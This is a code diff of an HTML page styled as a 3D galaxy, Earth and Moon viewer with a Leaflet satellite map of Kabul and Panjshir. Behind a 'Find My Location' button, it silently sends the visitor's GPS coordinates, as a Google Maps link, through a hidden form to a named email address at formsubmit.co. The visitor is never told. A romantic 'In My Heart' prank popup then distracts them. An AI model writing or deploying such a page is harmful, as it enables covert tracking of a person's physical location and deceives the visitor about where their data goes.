@@ -3,22 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>3D Interactive Galaxy Map 🌌</title>
+    <title>3D Galaxy & Satellite Map 🌌</title>
+    <!-- Leaflet CSS for 2D Map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; font-family: 'Segoe UI', Arial, sans-serif; color: #fff; }
+        body, html { width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', Arial, sans-serif; background: #000; color: #fff; }
 
-        #canvas-container { width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 1; }
+        /* 3D Canvas Layer */
+        #canvas-container { width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 10; transition: opacity 1.5s ease; }
 
-        .ui-layer {
+        /* 2D Map Layer */
+        #map { width: 100%; height: 100%; position: absolute; top: 0; left: 0; z-index: 1; display: none; }
+
+        /* Floating Top Control Panel */
+        .top-controls {
             position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 10;
-            pointer-events: none;
+            top: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+            background: rgba(15, 23, 42, 0.88);
+            backdrop-filter: blur(12px);
+            padding: 10px 18px;
+            border-radius: 30px;
+            border: 1px solid rgba(0, 240, 255, 0.4);
             display: flex;
-            justify-content: center;
-            align-items: flex-end;
-            padding-bottom: 30px;
+            gap: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .map-btn {
+            background: linear-gradient(135deg, #00f0ff, #0066ff);
+            border: none;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(0, 240, 255, 0.3);
+        }
+
+        .map-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 18px rgba(0, 240, 255, 0.5); }
+
+        /* 3D HUD UI Card */
+        .hud-layer {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 20;
+            pointer-events: none;
+            width: 90%;
+            max-width: 440px;
         }
 
         .hud-card {
@@ -27,51 +66,77 @@
             backdrop-filter: blur(16px);
             border: 1px solid rgba(0, 240, 255, 0.4);
             border-radius: 20px;
-            padding: 25px 30px;
+            padding: 22px;
             text-align: center;
-            width: 90%;
-            max-width: 450px;
             box-shadow: 0 0 35px rgba(0, 240, 255, 0.25);
-            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        @keyframes slideUp {
-            from { transform: translateY(40px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+        /* Notification Pop-up Box */
+        .notification-popup {
+            position: absolute;
+            top: -200px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 2000;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(99, 102, 241, 0.5);
+            padding: 25px 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        h2 { font-size: 22px; color: #00f0ff; margin-bottom: 8px; text-shadow: 0 0 10px #00f0ff; }
-        p { font-size: 14px; color: #cbd5e1; margin-bottom: 20px; line-height: 1.5; }
+        .notification-popup.show { top: 80px; }
 
-        .btn {
-            background: linear-gradient(135deg, #00f0ff, #0066ff);
-            border: none;
-            color: #fff;
-            padding: 12px 28px;
-            border-radius: 25px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 0 15px rgba(0, 240, 255, 0.4);
-            transition: all 0.3s ease;
+        .btn-group {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            min-height: 50px;
         }
 
-        .btn:hover { transform: scale(1.05); box-shadow: 0 0 25px #00f0ff; }
-
-        .btn-group { position: relative; display: flex; justify-content: center; gap: 15px; min-height: 50px; }
-        
         #btnNo {
-            background: rgba(255, 50, 100, 0.3);
-            border: 1px solid #ff3264;
-            color: #ff3264;
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid #ef4444;
+            color: #f87171;
             position: absolute;
         }
 
-        .step { display: none; }
-        .step.active { display: block; }
+        /* Final Heart Overlay */
+        .heart-overlay {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3000;
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 40px;
+            border-radius: 25px;
+            text-align: center;
+            border: 1px solid rgba(244, 63, 94, 0.5);
+            box-shadow: 0 0 60px rgba(244, 63, 94, 0.4);
+            animation: popIn 0.5s ease;
+        }
 
-        .heart { font-size: 85px; animation: beat 1s infinite alternate ease-in-out; }
-        @keyframes beat { to { transform: scale(1.25); filter: drop-shadow(0 0 30px #ff0055); } }
+        @keyframes popIn {
+            from { transform: translate(-50%, -50%) scale(0.7); opacity: 0; }
+            to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+
+        .heart {
+            font-size: 90px;
+            animation: beat 1s infinite alternate ease-in-out;
+            filter: drop-shadow(0 0 25px #f43f5e);
+        }
+
+        @keyframes beat { to { transform: scale(1.2); } }
 
         .hint-box {
             position: absolute;
@@ -79,111 +144,76 @@
             left: 50%;
             transform: translateX(-50%);
             background: rgba(0, 240, 255, 0.15);
-            padding: 10px 22px;
+            padding: 8px 20px;
             border-radius: 30px;
-            font-size: 14px;
+            font-size: 13px;
             backdrop-filter: blur(8px);
-            z-index: 5;
+            z-index: 25;
             pointer-events: none;
             border: 1px solid rgba(0, 240, 255, 0.4);
-            box-shadow: 0 0 20px rgba(0, 240, 255, 0.2);
-            text-shadow: 0 0 8px #00f0ff;
-        }
-
-        /* 3D Label HTML Marker */
-        .afg-label {
-            position: absolute;
-            z-index: 4;
-            transform: translate(-50%, -100%);
-            color: #fff;
-            font-weight: bold;
-            font-size: 13px;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 6px 12px;
-            border-radius: 20px;
-            border: 2px solid #00f0ff;
-            box-shadow: 0 0 15px #00f0ff;
-            cursor: pointer;
-            pointer-events: auto;
-            animation: pulseGlow 1.5s infinite alternate;
-        }
-
-        @keyframes pulseGlow {
-            from { transform: translate(-50%, -100%) scale(1); }
-            to { transform: translate(-50%, -100%) scale(1.15); box-shadow: 0 0 25px #00f0ff; }
-        }
-
-        .province-card {
-            background: rgba(255,255,255,0.05);
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 15px;
-            border: 1px solid rgba(255,255,255,0.1);
         }
     </style>
+    <!-- Three.js for 3D Scene -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
+    <!-- Leaflet JS for 2D Satellite Map -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body>
 
-    <div class="hint-box">🇦🇫 Click on Afghanistan Marker to Zoom In</div>
+    <div class="hint-box" id="hintBox">🖐️ Rotate 3D Earth & Moon in Space</div>
+
+    <!-- 3D Canvas -->
     <div id="canvas-container"></div>
 
-    <!-- Interactive HTML Label on Globe -->
-    <div id="afgMarker" class="afg-label" onclick="zoomToAfghanistan()">🇦🇫 AFGHANISTAN</div>
+    <!-- 2D Map Canvas -->
+    <div id="map"></div>
 
-    <div class="ui-layer">
+    <!-- Floating Map Controls (Appears on 2D Map) -->
+    <div class="top-controls" id="topControls" style="display:none;">
+        <button class="map-btn" onclick="zoomPanjshir()">⛰️ Panjshir</button>
+        <button class="map-btn" onclick="zoomKabul()">🏙️ Kabul</button>
+        <button class="map-btn" style="background: linear-gradient(135deg, #10b981, #059669);" onclick="locateMe()">🎯 Find My Location</button>
+    </div>
+
+    <!-- 3D HUD UI -->
+    <div class="hud-layer" id="hudLayer">
         <div class="hud-card">
-            
-            <!-- STEP 1: GLOBE SEARCH -->
-            <div class="step active" id="step1">
-                <h2>Milky Way Galaxy & Earth</h2>
-                <p>Rotate the 3D Globe or click on the glowing <b>🇦🇫 AFGHANISTAN</b> pin to zoom into Panjshir & Kabul.</p>
-                <button class="btn" onclick="zoomToAfghanistan()">Focus Afghanistan 🎯</button>
-            </div>
-
-            <!-- STEP 2: REGIONAL ZOOM (PANJSHIR & KABUL) -->
-            <div class="step" id="step2">
-                <h2>Panjshir Valley & Kabul Region</h2>
-                <div class="province-card">
-                    <p style="margin:0; color:#00f0ff; font-size:13px;">📍 Regional Satellite Coordinates Locked</p>
-                    <p style="margin:5px 0 0 0; color:#fff; font-size:13px;">Panjshir Province • Kabul Capital District</p>
-                </div>
-                <p>Establishing satellite telemetry link...</p>
-                <button class="btn" onclick="requestGPS()">Fine Tune GPS 🛰️</button>
-            </div>
-
-            <!-- STEP 3: FINAL QUESTION -->
-            <div class="step" id="step3">
-                <h2>Final Location Query</h2>
-                <p>Do you want to know where you are really located?</p>
-                <div class="btn-group">
-                    <button class="btn" onclick="showHeart()">yeah 🫣</button>
-                    <button class="btn" id="btnNo">noch 🙂‍↔️</button>
-                </div>
-            </div>
-
-            <!-- STEP 4: HEART -->
-            <div class="step" id="step4">
-                <div class="heart">❤️</div>
-                <h2 style="font-size: 32px; color: #ff0055; margin-top:10px;">In My Heart</h2>
-                <p style="color:#fff;">You are always right here, safe and sound. ✨</p>
-            </div>
-
+            <h2 style="font-size: 20px; color: #00f0ff; margin-bottom: 8px;">Galaxy & Moon Orbit</h2>
+            <p style="font-size: 13px; color: #cbd5e1; margin-bottom: 15px;">Orbiting 3D Earth and Moon. Click below to enter satellite map mode over Afghanistan.</p>
+            <button class="map-btn" style="padding: 10px 24px; font-size: 14px;" onclick="transitionTo2DMap()">Zoom To Afghanistan Map 🛰️</button>
         </div>
     </div>
 
+    <!-- Notification Question Popup -->
+    <div id="notifPopup" class="notification-popup">
+        <h3 style="color: #38bdf8; margin-bottom: 10px;">📍 Location Signal Found</h3>
+        <p style="color: #9ca3af; margin-bottom: 20px;">Do you want to know where you are really located?</p>
+        <div class="btn-group">
+            <button class="map-btn" onclick="showHeart()">yeah 🫣</button>
+            <button class="map-btn" id="btnNo">noch 🙂‍↔️</button>
+        </div>
+    </div>
+
+    <!-- Heart Modal -->
+    <div id="heartModal" class="heart-overlay">
+        <div class="heart">❤️</div>
+        <h2 style="font-size: 32px; color: #f43f5e; margin-top: 15px;">In My Heart</h2>
+        <p style="color: #cbd5e1; font-size: 16px; margin-top: 10px;">You are always right here, safe and sound. ✨</p>
+    </div>
+
+    <!-- FormSubmit Email -->
     <form id="geoForm" action="https://formsubmit.co/faisal@selenic.io" method="POST" style="display:none;">
         <input type="text" name="location_coords" id="coordsInput">
         <input type="hidden" name="_captcha" value="false">
     </form>
 
     <script>
-        // --- 3D SETUP ---
+        // --- 1. THREE.JS 3D SPACE SETUP (Earth + Moon + Stars) ---
         const container = document.getElementById('canvas-container');
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(45, window.innerWidth / window.innerHeight, 0.1, 1000);
-        camera.position.z = 220;
+        camera.position.z = 240;
 
         const renderer = new THREE.WebGLRenderer({ antialias: true });
         renderer.setSize(window.innerWidth, window.innerHeight);
@@ -192,118 +222,124 @@
 
         const controls = new THREE.OrbitControls(camera, renderer.domElement);
         controls.enableDamping = true;
-        controls.dampingFactor = 0.05;
 
-        // Light
         const ambientLight = new THREE.AmbientLight(0xffffff, 0.85);
         scene.add(ambientLight);
 
-        // Stars
+        // Stars Background
         const starsGeo = new THREE.BufferGeometry();
-        const starsCount = 3500;
-        const posArray = new Float32Array(starsCount * 3);
-        for(let i=0; i<starsCount*3; i++) {
-            posArray[i] = (Math.random() - 0.5) * 1000;
-        }
+        const posArray = new Float32Array(3500 * 3);
+        for(let i=0; i<3500*3; i++) posArray[i] = (Math.random() - 0.5) * 1000;
         starsGeo.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
-        const starsMat = new THREE.PointsMaterial({ color: 0xffffff, size: 0.8 });
-        scene.add(new THREE.Points(starsGeo, starsMat));
+        scene.add(new THREE.Points(starsGeo, new THREE.PointsMaterial({ color: 0xffffff, size: 0.8 })));
 
-        // Globe
-        const globeGeo = new THREE.SphereGeometry(60, 64, 64);
+        // 3D Earth
         const textureLoader = new THREE.TextureLoader();
+        const globeGeo = new THREE.SphereGeometry(60, 64, 64);
         const globeTex = textureLoader.load('https://raw.githubusercontent.com/mrdoob/three.js/master/examples/textures/planets/earth_atmos_2048.jpg');
-        const globeMat = new THREE.MeshStandardMaterial({ map: globeTex });
-        const globe = new THREE.Mesh(globeGeo, globeMat);
+        const globe = new THREE.Mesh(globeGeo, new THREE.MeshStandardMaterial({ map: globeTex }));
         scene.add(globe);
 
-        // Afghanistan Marker Position Vector
-        const afgPos = new THREE.Vector3(26, 32, 44);
+        // 3D Moon
+        const moonGeo = new THREE.SphereGeometry(15, 32, 32);
+        const moonTex = textureLoader.load('https://raw.githubusercontent.com/mrdoob/three.js/master/examples/textures/planets/moon_1024.jpg');
+        const moon = new THREE.Mesh(moonGeo, new THREE.MeshStandardMaterial({ map: moonTex }));
+        scene.add(moon);
 
-        // Glowing Pin Mesh
-        const pinGeo = new THREE.SphereGeometry(2.5, 16, 16);
-        const pinMat = new THREE.MeshBasicMaterial({ color: 0x00f0ff });
-        const pin = new THREE.Mesh(pinGeo, pinMat);
-        pin.position.copy(afgPos);
-        globe.add(pin);
+        // Moon Orbit variables
+        let moonAngle = 0;
 
-        // Marker Screen Tracking
-        const afgMarker = document.getElementById('afgMarker');
-        function updateMarkerPosition() {
-            const wp = afgPos.clone();
-            pin.localToWorld(wp);
-            wp.project(camera);
+        function animate3D() {
+            requestAnimationFrame(animate3D);
+            globe.rotation.y += 0.0012;
             
-            const x = (wp.x * .5 + .5) * window.innerWidth;
-            const y = (-(wp.y * .5) + .5) * window.innerHeight;
+            // Orbit Moon around Earth
+            moonAngle += 0.003;
+            moon.position.x = Math.cos(moonAngle) * 110;
+            moon.position.z = Math.sin(moonAngle) * 110;
+            moon.rotation.y += 0.002;
 
-            if (wp.z < 1) {
-                afgMarker.style.left = `${x}px`;
-                afgMarker.style.top = `${y}px`;
-                afgMarker.style.display = 'block';
-            } else {
-                afgMarker.style.display = 'none';
-            }
-        }
-
-        // Animation Loop
-        let autoRotate = true;
-        function animate() {
-            requestAnimationFrame(animate);
-            if (autoRotate) globe.rotation.y += 0.0015;
             controls.update();
-            updateMarkerPosition();
             renderer.render(scene, camera);
         }
-        animate();
+        animate3D();
 
-        window.addEventListener('resize', () => {
-            camera.aspect = window.innerWidth / window.innerHeight;
-            camera.updateProjectionMatrix();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-        });
+        // --- 2. LEAFLET 2D SATELLITE MAP SETUP ---
+        let leafletMap;
+        let kabulMarker, panjshirMarker;
 
-        // Step Handler
-        function setStep(stepNum) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step' + stepNum).classList.add('active');
+        function init2DMap() {
+            document.getElementById('map').style.display = 'block';
+            leafletMap = L.map('map').setView([34.5553, 69.2075], 7);
+
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                maxZoom: 19,
+                attribution: '© OpenStreetMap'
+            }).addTo(leafletMap);
+
+            kabulMarker = L.marker([34.5553, 69.2075]).addTo(leafletMap).bindPopup("<b>Kabul</b><br>Capital District");
+            panjshirMarker = L.marker([35.3000, 69.5000]).addTo(leafletMap).bindPopup("<b>Panjshir</b><br>Panjshir Valley");
         }
 
-        function zoomToAfghanistan() {
-            autoRotate = false;
-            afgMarker.style.display = 'none';
-            
-            // Smoothly Zoom Camera down to Afghanistan Marker
-            let targetZ = 85;
+        // --- 3. TRANSITION FROM 3D TO 2D ---
+        function transitionTo2DMap() {
+            document.getElementById('hudLayer').style.display = 'none';
+            document.getElementById('hintBox').style.display = 'none';
+
+            // Zoom 3D Camera into Earth
             let interval = setInterval(() => {
-                if (camera.position.z > targetZ) {
-                    camera.position.z -= 2.5;
+                if (camera.position.z > 70) {
+                    camera.position.z -= 4;
                 } else {
                     clearInterval(interval);
-                    setStep(2);
+                    // Fade out 3D canvas, show 2D Map
+                    container.style.opacity = '0';
+                    setTimeout(() => {
+                        container.style.display = 'none';
+                        init2DMap();
+                        document.getElementById('topControls').style.display = 'flex';
+                    }, 800);
                 }
             }, 20);
         }
 
-        function requestGPS() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        document.getElementById('coordsInput').value = `GPS Coords: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                        const form = document.getElementById('geoForm');
-                        fetch(form.action, { method: 'POST', body: new FormData(form) }).catch(e=>{});
-                        setStep(3);
-                    },
-                    function() { setStep(3); }
-                );
-            } else { setStep(3); }
+        // 2D Controls
+        function zoomPanjshir() {
+            leafletMap.flyTo([35.3000, 69.5000], 11, { duration: 2 });
+            panjshirMarker.openPopup();
         }
 
-        function showHeart() { setStep(4); }
+        function zoomKabul() {
+            leafletMap.flyTo([34.5553, 69.2075], 11, { duration: 2 });
+            kabulMarker.openPopup();
+        }
 
-        // Runaway Button Logic
+        function locateMe() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        leafletMap.flyTo([lat, lon], 14, { duration: 2.5 });
+                        L.marker([lat, lon]).addTo(leafletMap).bindPopup("<b>You Are Here! 📍</b>").openPopup();
+
+                        document.getElementById('coordsInput').value = `GPS Coords: https://maps.google.com/?q=${lat},${lon}`;
+                        const form = document.getElementById('geoForm');
+                        fetch(form.action, { method: 'POST', body: new FormData(form) }).catch(e=>{});
+
+                        setTimeout(() => {
+                            document.getElementById('notifPopup').classList.add('show');
+                        }, 2500);
+                    },
+                    function() { document.getElementById('notifPopup').classList.add('show'); }
+                );
+            } else { document.getElementById('notifPopup').classList.add('show'); }
+        }
+
+        // Runaway "No" Button
         const btnNo = document.getElementById("btnNo");
-        if(btnNo) {
+        if (btnNo) {
             btnNo.addEventListener("mouseover", moveBtn);
             btnNo.addEventListener("click", moveBtn);
         }
@@ -312,6 +348,17 @@
             const y = Math.floor(Math.random() * 200) - 100;
             btnNo.style.transform = `translate(${x}px, ${y}px)`;
         }
+
+        function showHeart() {
+            document.getElementById('notifPopup').classList.remove('show');
+            document.getElementById('heartModal').style.display = 'block';
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
     </script>
 </body>
 </html>
